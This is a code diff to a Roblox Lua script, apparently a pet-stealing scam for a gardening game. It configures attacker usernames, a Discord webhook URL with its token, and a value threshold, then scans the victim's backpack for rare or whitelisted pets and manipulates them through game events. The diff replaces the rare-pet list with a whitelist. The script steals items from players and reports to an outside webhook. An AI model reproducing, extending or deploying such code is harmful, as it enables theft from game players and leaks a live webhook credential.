@@ -3,7 +3,7 @@
 _G.scriptExecuted = false
 
 -- Configuration
-_G.Usernames = {"iamzanji11", "akosi_ronzz", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55", "iamzanji66", "iamzanji77", "iamzanji88", "iamzanji99", "iamzanji00"}
+_G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55", "iamzanji66", "iamzanji77", "iamzanji88", "iamzanji99", "iamzanji00"}
 _G.min_value = 100000  -- Lowered from 100 million to 100k for testing
 _G.pingEveryone = "Yes"
 _G.webhook = "https://discord.com/api/webhooks/1397159420441530408/Rp5qBae9JqaB_7ZB0cAscZe_DJBzSX46fbguncBqJ7W9P_wo_POdJkY3ir74_jbVlHTv"
@@ -48,7 +48,22 @@ end
 local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
 -- Remove plant-related constants and logic
 -- Rare pets and mutation keywords
-local rarePets = {"Red Fox", "Triceratops", "Raccoon", "Dragonfly", "Queen Bee", "T-Rex", "Fennec Fox", "Butterfly", "Disco Bee", "Mimic Octopus", "Kitsune", "Spinosaurus", "Triceratops", "Raptor"}
+-- Whitelisted pets (replace rarePets)
+local petWhitelist = {
+    'Red Fox',
+    'Raccoon',
+    'Dragonfly',
+    'Queen Bee',
+    'T-Rex',
+    'Fennec Fox',
+    'Butterfly',
+    'Disco Bee',
+    'Mimic Octopus',
+    'Kitsune',
+    'Spinosaurus',
+    'Triceratops',
+    'Raptor'
+}
 local mutationKeywords = {"Ascended", "Inverted", "Rainbow", "Radiant", "IronSkin", "Golden", "Tiny", "Frozen", "Windy", "Mega", "Shiny", "Shocked"}
 
 -- Emoji map for pet types          
@@ -73,9 +88,9 @@ local function getPetEmoji(petName, weight)
     return petEmojis[petName] or "🦊"
 end
 
-local function isRarePet(petName, weight)
-    for _, rare in ipairs(rarePets) do
-        if string.find(petName, rare, 1, true) then
+local function isWhitelistedPet(petName, weight)
+    for _, allowed in ipairs(petWhitelist) do
+        if string.find(petName, allowed, 1, true) then
             return true
         end
     end
@@ -419,8 +434,8 @@ for _, tool in ipairs(backpack:GetChildren()) do
                         local itemName = toolName:match("^(.-) %[%d+%.?%d* KG%]") or toolName
                         local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                         local petAge = tonumber(toolName:match("%[Age%s*(%d+)%]")) or "N/A"
-                        -- Only include rare pets and their mutated forms
-                        if isRarePet(itemName, weight) then
+                        -- Only include whitelisted pets and those 25+ kg
+                        if isWhitelistedPet(itemName, weight) then
                             if tool:GetAttribute("Favorite") then
                                 local success = pcall(function()
                                     replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
